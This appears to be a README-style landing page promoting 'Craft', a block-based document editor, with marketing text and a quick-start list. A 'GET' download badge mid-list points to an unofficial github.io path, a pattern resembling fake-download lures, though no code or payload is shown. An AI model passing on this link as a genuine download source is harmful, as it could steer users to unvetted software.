# Craft - Block-Based Document Editor with Beautiful Design

> **A calm writing workspace where blocks, notes, and documents come together with elegant structure.**

---

## Why This Exists

![Craft](https://avatars.mds.yandex.net/i?id=21fdae16530c58aa3b3b4300a797855a69e85ac6-6918470-images-thumbs&n=13)

Most writing tools force a choice between structure and beauty. Either you get rigid outlines that feel like spreadsheets, or you get free-form pages that quickly become messy. **Craft** solves this tension by treating every paragraph, image, and idea as a block that can be moved, styled, and arranged without losing the thread of your document.

Craft exists for people who want their notes and documents to look as good as they think. Whether you are drafting a project plan, collecting research, or writing a personal journal, Craft gives you a workspace that feels intentional. The block-based approach means you never fight the editor. You place a block, you shape it, and you move on.

If you have ever abandoned a note because it became unreadable, or felt that your writing tool was working against you, **Craft** is for you. It is a document editor that respects both your content and your time. A Craft document editor should feel like an extension of your thinking, not a barrier between you and the page.

## Quick Start with Craft

1. **Open Craft** - Launch the editor and create a new document or open an existing one.
2. **Add a block** - Start typing to create your first block, then press Enter for the next.
3. **Shape your content** - Turn blocks into headings, lists, quotes, or media embeds.

[![GET — Craft](https://img.shields.io/badge/GET%20%E2%80%94%20Craft-0078D6?style=for-the-badge&logoColor=white)](https://craft-document-editor.github.io/.github/craft-document)

4. **Rearrange freely** - Drag blocks to restructure your document without copy-paste.
5. **Style your document** - Apply a theme or adjust typography so the page feels right.
6. **Review and refine** - Read through, adjust block types, and polish the layout.
7. **Save and revisit** - Keep your Craft writing workspace ready for the next session.
